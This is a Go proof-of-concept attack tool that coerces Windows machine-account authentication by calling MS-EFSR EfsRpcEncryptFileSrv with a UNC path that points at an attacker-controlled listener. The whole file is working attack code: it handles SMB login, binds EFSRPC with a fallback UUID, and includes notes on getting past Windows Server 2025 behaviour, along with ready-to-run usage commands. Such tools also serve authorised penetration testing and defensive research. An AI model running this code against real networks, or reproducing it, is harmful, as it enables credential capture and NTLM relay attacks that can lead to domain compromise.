// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 08 Sep 2026
//
// Proof of concept for coercing authentication with MS-EFSR::EfsRpcEncryptFileSrv()
// (opnum 4), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the efsrpc interface
//
// The target opens the [in,string] FileName it is given: passing a UNC path makes the
// remote machine account authenticate to the listener over SMB ([MS-EFSR] 3.1.4.2.1).
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	efsrpc "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/c681d488-d850-11d0-8c52-00c04fd90f7e/1.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/v5/pdu"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	shareName string
	filePath  string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-EFSR::EfsRpcEncryptFileSrv() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		// EFSRPC is reachable over several pipes; \efsrpc is the dedicated endpoint, but
		// \lsarpc, \samr, \netlogon and \lsass expose the same interface ([MS-EFSR] 1.9 / 2.1).
		group_network.NewStringArgument(&pipeName, "", "--pipe", efsrpc.PipeName, false, "Named pipe to bind the efsrpc interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		group_coerce.NewStringArgument(&shareName, "", "--share", "share", false, "Share name of the UNC path sent to the target.")
		group_coerce.NewStringArgument(&filePath, "", "--file", "file.txt", false, "File name of the UNC path sent to the target.")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// efsRpcEncryptFileSrvRequest and efsRpcEncryptFileSrvResponse are the [in] parameters and
// the return value of EfsRpcEncryptFileSrv (opnum 4) ([MS-EFSR] 3.1.4.2.5):
//
//	long EfsRpcEncryptFileSrv([in] handle_t binding_h, [in, string] wchar_t* FileName);
//
// The binding handle is implicit, and ndr.WSTR marshals FileName as the inline [ref] wide
// string the IDL asks for (the NUL terminator is added by the marshaller).
//
// Manticore ships this call ready-made as
// interfaces/c681d488-.../1.0/functions.EfsRpcEncryptFileSrv, but that wrapper folds a
// nonzero return value into an error string; issuing the call here keeps the numeric status
// so it can be reported by name.
type efsRpcEncryptFileSrvRequest struct {
	FileName ndr.WSTR
}

func (*efsRpcEncryptFileSrvRequest) Opnum() uint16 { return efsrpc.OpnumEfsRpcEncryptFileSrv }

type efsRpcEncryptFileSrvResponse struct {
	Status ndr.DWORD `ndr:"retval"`
}

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that EFSRPC methods return
// but that Manticore's efsrpc status table does not cover yet. efsrpc.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := efsrpc.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// altEfsrpcUUID is the second interface UUID MS-EFSR is registered under ([MS-EFSR] 1.9
// "Standards Assignments" lists both). It matters in practice: on Windows Server 2025 the
// classic c681d488-d850-11d0-8c52-00c04fd90f7e UUID is not registered at all — EFS
// exposes only this one (plus EfsK 04eeb297-cbf4-466b-8a2a-bfd6a2f10bba), and only on
// \pipe\efsrpc — so a bind of the classic UUID is rejected with
// abstract_syntax_not_supported.
const altEfsrpcUUID = "df1941c5-fe89-4e79-bf10-463657acf44d"

// efsrpcSyntaxes returns the abstract syntaxes to try, in order: the classic EFSRPC
// interface first, then the alternate UUID that newer Windows versions register.
func efsrpcSyntaxes() []syntax.SyntaxID {
	candidates := []syntax.SyntaxID{efsrpc.SyntaxID()}
	if uuid, err := guid.FromFormatD(altEfsrpcUUID); err == nil {
		candidates = append(candidates, syntax.SyntaxID{UUID: *uuid, MajorVersion: 1, MinorVersion: 0})
	}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range efsrpcSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// The EFS service wants the calls authenticated at the RPC layer on top of the SMB
		// session: on Windows Server 2025 an anonymously bound association answers opnum 4
		// with nca_s_fault_access_denied. Sign and seal every PDU (NTLM, packet privacy).
		if err := candidate.SetAuth(pdu.AuthTypeNTLMSSP, pdu.AuthLevelPktPrivacy, creds); err != nil {
			logger.Errorf("Error configuring RPC authentication: %s", err)
			candidate.Close()
			return
		}
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the efsrpc interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	// The UNC path the target will open, and therefore authenticate to.
	uncPath := fmt.Sprintf(`\\%s\%s\%s`, listener, shareName, filePath)

	logger.Infof("Calling EfsRpcEncryptFileSrv(FileName='%s') ...", uncPath)
	request := &efsRpcEncryptFileSrvRequest{FileName: ndr.WSTR(uncPath)}
	var response efsRpcEncryptFileSrvResponse
	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the EFSRPC method. nca_s_unk_if in
		// particular is what the lsass-aliased pipes (\lsarpc, \netlogon, \samr, \lsass)
		// answer on Windows Server 2025: they accept the bind but dispatch no EFSRPC call,
		// so retry with --pipe \efsrpc.
		logger.Errorf("EfsRpcEncryptFileSrv() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == efsrpc.StatusSuccess {
		logger.Infof("EfsRpcEncryptFileSrv() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target fails to encrypt a file it cannot reach, but
	// it has already authenticated to the listener to find that out.
	logger.Infof("EfsRpcEncryptFileSrv() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
